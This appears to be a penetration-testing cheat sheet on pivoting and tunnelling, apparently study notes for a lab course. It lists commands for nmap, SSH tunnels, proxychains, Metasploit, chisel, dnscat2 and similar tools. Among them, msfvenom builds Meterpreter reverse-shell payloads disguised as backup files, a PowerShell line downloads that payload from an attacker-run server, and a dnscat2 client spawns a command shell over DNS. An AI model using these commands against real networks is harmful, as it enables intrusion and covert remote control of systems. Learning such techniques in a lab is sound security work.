### **Network Configuration and Monitoring**

```bash
# Display network configurations
ifconfig  
### Linux command to display current network configurations.

ipconfig  
### Windows command to display current network configurations.

# Display routing table
netstat -r  
### Displays the routing table for all IPv4-based protocols.

# Netstat for monitoring
netstat -antp | grep 1234  
### Linux: Filter network connections for port 1234.

netstat -antb | findstr 1080  
### Windows: List TCP connections on port 1080.
```

---

### **Nmap**

```bash
# Basic port scanning
nmap -sT -p22,3306 <IPaddressofTarget>  
### Scan for open SSH or MySQL ports.

nmap -v -sV -p1234 localhost  
### Scan localhost on port 1234 with version detection.
```

---

### **SSH and Tunneling**

```bash
# SSH tunneling
ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>  
### Create SSH tunnel to remote MySQL service.

ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>  
### SSH tunnel for multiple ports.

ssh -D 9050 ubuntu@<IPaddressofTarget>  
### Dynamic port forwarding for SOCKS proxy.

ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN  
### Reverse SSH tunnel.
```

---

### **Proxychains**

```bash
# Proxychains configuration
tail -4 /etc/proxychains.conf  
### View last 4 lines of proxychains config.

# Proxychains usage
proxychains nmap -v -sn 172.16.5.1-200  
### Proxychains with Nmap ping scan.

proxychains msfconsole  
### Launch Metasploit through Proxychains.
```

---

### **Metasploit**

```bash
# Module search and usage
msf6 > search rdp_scanner  
### Search for RDP scanner module.

msf6 > use exploit/multi/handler  
### Select multi-handler module.

msf6 > use auxiliary/server/socks_proxy  
### Use SOCKS proxy module.

msf6 auxiliary(server/socks_proxy) > jobs  
### List running jobs.

msf6 > use post/multi/manage/autoroute  
### Select autoroute module.
```

---

### **File Transfer**

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/  
### SCP file transfer to remote host.

scp -r rpivot ubuntu@<IPaddressOfTarget>  
### SCP entire directory to target.

# Python HTTP server
python3 -m http.server 8123  
### Start HTTP server on port 8123.

# PowerShell file download
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"  
### Download file using PowerShell.
```

---

### **Metasploit Payloads**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080  
### Create Windows reverse HTTPS payload.

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPofAttackHost> -f elf -o backupjob LPORT=8080  
### Create Linux reverse TCP payload.
```

---

### **Socat**

```bash
socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80  
### Forward port 8080 to attack host port 80.
```

---

### **Plink**

```bash
plink -D 9050 ubuntu@<IPaddressofTarget>  
### Plink dynamic port forwarding.
```

---

### **SSHuttle**

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v  
### Create route through target network.
```

---

### **RPivot**

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0  
### Start RPivot server.

python2.7 client.py --server-ip 10.10.14.18 --server-port 9999  
### Connect RPivot client to server.
```

---

### **DNScat2**

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache  
### Start DNScat2 server.

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd  
### PowerShell client connection.
```

---

### **Chisel**

```bash
./chisel server -v -p 1234 --socks5  
### Start Chisel server.

./chisel client -v 10.129.202.64:1234 socks  
### Connect Chisel client to server.
```

---

### **Ptunnel-ng**

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22  
### Start Ptunnel-ng server.

sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22  
### Connect Ptunnel-ng client.
```

---

### **Windows PortProxy**

```powershell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25  
### Add portproxy rule.

netsh.exe interface portproxy show v4tov4  
### Show portproxy configuration.
```